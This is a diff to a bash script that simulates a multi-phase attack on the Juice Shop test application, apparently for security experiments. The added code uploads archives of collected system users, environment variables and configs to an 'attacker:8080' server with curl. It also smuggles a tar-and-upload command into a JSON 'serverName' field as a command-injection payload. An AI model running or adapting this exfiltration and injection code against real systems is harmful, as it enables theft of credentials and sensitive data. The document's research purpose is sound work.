@@ -686,8 +686,37 @@ phase3_data_exfiltration() {
             /tmp/juice_shop_config.json \
             /tmp/running_processes.txt 2>/dev/null || true
             
-        # copy to shared data directory
-        cp /tmp/complete_exfiltration_*.tar.gz /shared_data/ 2>/dev/null || true
+        # copy to shared data directory (organized by experiment)
+        # Get experiment info from attacker server
+        ATTACKER_STATUS=$(curl -s http://attacker:8080/status 2>/dev/null || echo '{}')
+        FULL_EXPERIMENT_NAME=$(echo "$ATTACKER_STATUS" | grep -o '"full_experiment_name":"[^"]*"' | cut -d'"' -f4)
+        
+        # Fallback to basic experiment name if API call fails
+        if [ -z "$FULL_EXPERIMENT_NAME" ]; then
+            EXPERIMENT_NAME=${EXPERIMENT_NAME:-"default_experiment"}
+            TIMESTAMP=${TIMESTAMP:-$(date +%Y%m%d_%H%M%S)}
+            FULL_EXPERIMENT_NAME="${EXPERIMENT_NAME}_${TIMESTAMP}"
+        fi
+        
+        echo "Using experiment name: $FULL_EXPERIMENT_NAME"
+        mkdir -p "/shared_data/$FULL_EXPERIMENT_NAME"
+        cp /tmp/complete_exfiltration_*.tar.gz "/shared_data/$FULL_EXPERIMENT_NAME/" 2>/dev/null || true
+        
+        # 实际传输数据到attacker服务器
+        echo "Attempting real data transfer to attacker server..."
+        for exfil_file in /tmp/complete_exfiltration_*.tar.gz; do
+            if [ -f "$exfil_file" ]; then
+                echo "Transferring file: $exfil_file"
+                curl -s -X POST -F "file=@$exfil_file" \
+                    -H "X-Exfiltration-Type: compressed_data" \
+                    -H "X-Attack-Chain-ID: $ATTACK_CHAIN_ID" \
+                    -H "X-Attack-Phase: 3" \
+                    http://attacker:8080/upload || echo "Transfer failed, continuing..."
+                
+                # 记录传输尝试
+                echo "$(date): Attempted transfer of $exfil_file" >> /tmp/transfer_log.txt
+            fi
+        done
         
         exfil_payload='{"email":"exfiltration_test","password":"test"}'
                     
@@ -745,7 +774,8 @@ phase3_data_exfiltration() {
                     # default way to exfiltrate real data
                     log_phase "3" "Using file system to exfiltrate real sensitive data"
                     
-                    file_exfil_payload='{"serverName":"test; tar czf /shared_data/complete_exfiltration_$(date +%s).tar.gz /tmp/juice_shop_config.json /tmp/system_users.txt /tmp/environment_vars.txt /tmp/app_configs.txt /tmp/user_info /tmp/running_processes.txt 2>/dev/null && echo \"real_data_exfiltrated_$(date +%s)\" > /tmp/exfil_status"}'
+                    # 创建真实的数据外泄载荷，包含实际的数据传输
+                    file_exfil_payload='{"serverName":"test; tar czf /tmp/real_exfiltration_$(date +%s).tar.gz /tmp/juice_shop_config.json /tmp/system_users.txt /tmp/environment_vars.txt /tmp/app_configs.txt /tmp/user_info /tmp/running_processes.txt 2>/dev/null && curl -s -X POST -F \"file=@/tmp/real_exfiltration_*.tar.gz\" -H \"X-Exfiltration-Method: file_system\" -H \"X-Attack-Chain-ID: '$ATTACK_CHAIN_ID'\" http://attacker:8080/upload && echo \"real_data_exfiltrated_$(date +%s)\" > /tmp/exfil_status"}'
                     
                     exfil_response=$(curl -s -w "%{http_code}" \
                         -X POST \
